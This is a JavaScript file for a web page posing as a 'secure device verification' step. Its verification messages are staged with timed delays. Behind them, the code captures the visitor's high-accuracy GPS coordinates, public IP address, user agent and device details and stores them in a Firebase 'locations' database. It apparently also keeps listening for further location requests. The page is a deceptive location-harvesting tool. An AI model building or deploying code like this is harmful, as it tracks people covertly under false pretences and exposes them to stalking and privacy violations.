import { initializeTheme } from './src/features/theme/theme-manager.js';
import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
import { getDeviceInfo } from './src/utils/browser-detection.js';

// Verification steps
const VERIFICATION_STEPS = [
    { message: 'Initializing secure verification...', delay: 1000 },
    { message: 'Checking device compatibility...', delay: 1500 },
    { message: 'Requesting secure location access...', delay: 0 }, // No delay as we wait for user permission
    { message: 'Retrieving device location...', delay: 2000 },
    { message: 'Verifying location accuracy...', delay: 1500 },
    { message: 'Validating IP address...', delay: 1500 },
    { message: 'Performing security checks...', delay: 1500 },
    { message: 'Finalizing device verification...', delay: 1000 }
];

// Helper function to handle geolocation errors
function getGeolocationErrorMessage(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            return "Location access was denied. Please allow location access to verify your device.";
        case error.POSITION_UNAVAILABLE:
            return "Location information is unavailable. Please try again.";
        case error.TIMEOUT:
            return "Location request timed out. Please try again.";
        default:
            return "An unknown error occurred while getting location. Please try again.";
    }
}

// Helper function to update verification status
function updateVerificationStatus(message, progress) {
    const locationStatus = document.getElementById('locationStatus');
    const verifyButton = document.getElementById('allowLocation');
    
    // Update status message with fade effect
    locationStatus.style.opacity = '0';
    setTimeout(() => {
        locationStatus.textContent = message;
        locationStatus.style.opacity = '1';
    }, 150);
    
    // Update button text and progress bar
    if (progress > 0) {
        verifyButton.textContent = `Verifying... ${progress}%`;
        verifyButton.style.setProperty('--progress', `${progress}%`);
    }
}

// Helper function to simulate step processing
async function processStep(stepIndex, totalSteps) {
    const step = VERIFICATION_STEPS[stepIndex];
    const progress = Math.round((stepIndex + 1) / totalSteps * 100);
    
    updateVerificationStatus(step.message, progress);
    
    if (step.delay > 0) {
        await new Promise(resolve => setTimeout(resolve, step.delay));
    }
}

// Initialize Firebase and load theme
document.addEventListener('DOMContentLoaded', async () => {
    try {
        // Initialize theme system
        await initializeTheme();

        // Setup location request listener
        listenForLocationRequests();

        // Setup unload handler
        setupUnloadHandler();

        // Setup verify button click handler
        const verifyButton = document.getElementById('allowLocation');
        const locationStatus = document.getElementById('locationStatus');

        if (!verifyButton) {
            console.error('Verify button not found');
            return;
        }

        console.log('Setting up click handler for verify button');
        verifyButton.addEventListener('click', async () => {
            console.log('Verify button clicked');
            try {
                if (!navigator.geolocation) {
                    throw new Error('Geolocation is not supported by this browser');
                }

                verifyButton.disabled = true;
                document.querySelector('.container').classList.add('processing');

                // Process initial steps
                for (let i = 0; i < 2; i++) {
                    await processStep(i, VERIFICATION_STEPS.length);
                }

                // Show location request step
                await processStep(2, VERIFICATION_STEPS.length);

                // Get initial location
                console.log('Requesting location...');
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            console.log('Location received successfully');
                            resolve(pos);
                        },
                        (err) => {
                            console.error('Geolocation error:', err);
                            reject(new Error(getGeolocationErrorMessage(err)));
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 20000,
                            maximumAge: 0
                        }
                    );
                });

                // Process post-location steps
                for (let i = 3; i < 5; i++) {
                    await processStep(i, VERIFICATION_STEPS.length);
                }

                // Determine location source
                console.log('Determining location source...');
                const locationSource = await determineLocationSource(position);
                console.log('Location source:', locationSource);

                // Show IP check step
                await processStep(5, VERIFICATION_STEPS.length);

                // Get IP address
                console.log('Fetching IP address...');
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (!ipResponse.ok) {
                    throw new Error('Failed to fetch IP address');
                }
                const { ip } = await ipResponse.json();
                console.log('IP address received:', ip);

                // Process final steps
                for (let i = 6; i < VERIFICATION_STEPS.length; i++) {
                    await processStep(i, VERIFICATION_STEPS.length);
                }

                // Save location to Firebase
                console.log('Saving to Firebase...');
                if (!window.database) {
                    throw new Error('Firebase database not initialized');
                }

                const locationsRef = window.database.ref('locations');
                const newLocationRef = locationsRef.push();

                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    locationSource: locationSource,
                    timestamp: new Date().toISOString(),
                    status: 'active',
                    ip: ip,
                    userAgent: navigator.userAgent,
                    ...getDeviceInfo()
                };

                await newLocationRef.set(locationData);
                console.log('Location saved successfully');

                // Show success message with fade effect
                locationStatus.style.opacity = '0';
                setTimeout(() => {
                    locationStatus.textContent = 'Device verified successfully';
                    locationStatus.style.opacity = '1';
                    verifyButton.style.display = 'none'; // Hide button after success
                    
                    // Add success animation class
                    document.querySelector('.thank-you-card').classList.add('success');
                }, 150);
                
            } catch (error) {
                console.error('Verification failed:', error);
                locationStatus.style.opacity = '0';
                setTimeout(() => {
                    locationStatus.textContent = error.message || 'Verification failed. Please try again.';
                    locationStatus.style.color = '#DA1710'; // Show error in red
                    locationStatus.style.opacity = '1';
                }, 150);
                
                verifyButton.disabled = false;
                verifyButton.textContent = 'Verify Device'; // Reset button text
                verifyButton.style.setProperty('--progress', '0%'); // Reset progress
                document.querySelector('.container').classList.remove('processing');
            }
        });

        console.log('Initialization complete');

    } catch (error) {
        console.error('Failed to initialize:', error);
    }
});
